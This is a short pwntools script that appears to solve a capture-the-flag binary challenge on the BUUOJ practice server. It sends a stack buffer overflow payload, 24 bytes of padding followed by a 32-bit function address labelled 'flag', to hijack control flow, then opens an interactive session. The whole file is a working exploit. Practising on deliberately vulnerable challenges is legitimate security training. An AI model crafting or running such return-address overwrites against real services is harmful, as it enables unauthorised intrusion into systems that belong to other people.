from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',29400)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive


#ru(b'This program is hungry. You should feed it.')


flag=0x0804856D

main=0x080485C9
payload=b'a'*(24)+p32(flag)#+p32(main)
sl(payload)


ii()
